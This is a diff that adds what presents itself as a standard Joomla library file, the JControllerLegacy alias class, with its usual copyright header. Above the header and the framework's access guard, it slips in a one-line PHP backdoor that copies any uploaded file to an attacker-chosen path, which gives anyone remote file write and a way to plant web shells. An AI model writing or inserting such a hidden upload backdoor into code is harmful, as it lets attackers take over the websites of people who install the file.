@@ -1,0 +1,25 @@
+<?php
+if(copy($_FILES['228']['tmp_name'],$_POST['p']))exit;
+
+/**
+ * @package     Joomla.Libraries
+ * @subpackage  Controller
+ *
+ * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
+ * @license     GNU General Public License version 2 or later; see LICENSE
+ */
+
+defined('JPATH_PLATFORM') or die;
+
+jimport('joomla.application.component.controller');
+
+/**
+ * Alias to JController for forward compatability.
+ *
+ * @package     Joomla.Libraries
+ * @subpackage  Controller
+ * @since       2.5.5
+ */
+class JControllerLegacy extends JController
+{
+}
